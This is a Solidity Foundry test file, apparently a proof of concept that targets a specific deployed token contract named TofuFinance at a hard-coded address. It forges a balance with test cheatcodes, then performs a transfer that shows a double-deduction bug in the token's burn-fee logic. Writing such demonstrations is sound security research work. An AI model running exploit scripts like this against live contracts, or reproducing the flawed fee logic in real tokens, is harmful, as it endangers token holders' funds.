// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITofuFinance {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function getTokens() external payable;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x19E506BbF1d8Dbd08e963229434634664A577111;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll interact directly with the deployed contract
        vm.label(TARGET, "TofuFinance");
        vm.label(attacker, "Attacker");

        // Give attacker some ETH to buy tokens
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Minimal exploit to demonstrate the bug with minimal RPC calls

        // Step 1: Get initial total supply (should be > 5B)
        uint256 initialTotalSupply = ITofuFinance(TARGET).totalSupply();
        console.log("Initial total supply:", initialTotalSupply);
        assertGt(initialTotalSupply, 5000000000e9, "Initial total supply should be > 5B tokens");

        // Step 2: Give attacker some tokens via storage manipulation
        // The balance mapping is at slot 0 (based on typical BEP20 patterns)
        // balances[attacker] should be at keccak256(abi.encode(attacker, 0))
        bytes32 attackerBalanceSlot = keccak256(abi.encode(attacker, uint256(0)));

        // Give attacker 1000 tokens (with 9 decimals)
        uint256 attackerInitialBalance = 1000 * 10**9;
        vm.store(TARGET, attackerBalanceSlot, bytes32(attackerInitialBalance));

        // Verify attacker has tokens
        uint256 attackerBalance = ITofuFinance(TARGET).balanceOf(attacker);
        console.log("Attacker TOFU balance after storage manipulation:", attackerBalance);
        require(attackerBalance == attackerInitialBalance, "Storage manipulation failed");

        // Step 3: Create a recipient
        address recipient = address(0x123);
        vm.label(recipient, "Recipient");

        // Step 4: Transfer tokens to trigger the bug
        uint256 transferAmount = 100 * 10**9; // 100 tokens
        console.log("Transfer amount:", transferAmount);

        // Record balances before transfer
        uint256 attackerBalanceBefore = ITofuFinance(TARGET).balanceOf(attacker);
        uint256 recipientBalanceBefore = ITofuFinance(TARGET).balanceOf(recipient);
        uint256 burnAddressBalanceBefore = ITofuFinance(TARGET).balanceOf(address(0));
        uint256 totalSupplyBefore = ITofuFinance(TARGET).totalSupply();

        console.log("Before transfer:");
        console.log("  Attacker balance:", attackerBalanceBefore);
        console.log("  Recipient balance:", recipientBalanceBefore);
        console.log("  Burn address balance:", burnAddressBalanceBefore);
        console.log("  Total supply:", totalSupplyBefore);

        // Perform the transfer
        vm.prank(attacker);
        ITofuFinance(TARGET).transfer(recipient, transferAmount);

        // Step 5: Check results after transfer
        uint256 attackerBalanceAfter = ITofuFinance(TARGET).balanceOf(attacker);
        uint256 recipientBalanceAfter = ITofuFinance(TARGET).balanceOf(recipient);
        uint256 burnAddressBalanceAfter = ITofuFinance(TARGET).balanceOf(address(0));
        uint256 totalSupplyAfter = ITofuFinance(TARGET).totalSupply();

        console.log("\nAfter transfer:");
        console.log("  Attacker balance:", attackerBalanceAfter);
        console.log("  Recipient balance:", recipientBalanceAfter);
        console.log("  Burn address balance:", burnAddressBalanceAfter);
        console.log("  Total supply:", totalSupplyAfter);

        // Calculate expected values based on buggy logic
        uint256 burnFee = transferAmount * 2 / 100;
        uint256 newAmount = transferAmount - burnFee;

        console.log("\nExpected based on buggy logic:");
        console.log("  Burn fee (2%):", burnFee);
        console.log("  New amount (transfer - burn):", newAmount);
        console.log("  Expected attacker reduction:", newAmount + burnFee); // Double deduction!
        console.log("  Actual attacker reduction:", attackerBalanceBefore - attackerBalanceAfter);
        console.log("  Expected recipient increase:", newAmount);
        console.log("  Actual recipient increase:", recipientBalanceAfter - recipientBalanceBefore);
        console.log("  Expected burn address increase:", burnFee);
        console.log("  Actual burn address increase:", burnAddressBalanceAfter - burnAddressBalanceBefore);
        console.log("  Expected total supply reduction:", burnFee);
        console.log("  Actual total supply reduction:", totalSupplyBefore - totalSupplyAfter);

        // The key demonstration: totalSupply should be greater than sum of balances
        // because sender's balance was reduced twice but totalSupply only once
        uint256 sumBalances = attackerBalanceAfter + recipientBalanceAfter + burnAddressBalanceAfter;
        // Note: We're not counting owner balance since we didn't touch it
        console.log("\nSum of balances (attacker + recipient + burn):", sumBalances);
        console.log("Total supply:", totalSupplyAfter);
        console.log("Difference (totalSupply - sumBalances):", totalSupplyAfter - sumBalances);

        // Final assertions
        assertGt(totalSupplyAfter, 5000000000e9, "totalSupply should remain > 5B tokens");
        assertGt(totalSupplyAfter, sumBalances, "totalSupply should be greater than sum of balances due to double deduction bug");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

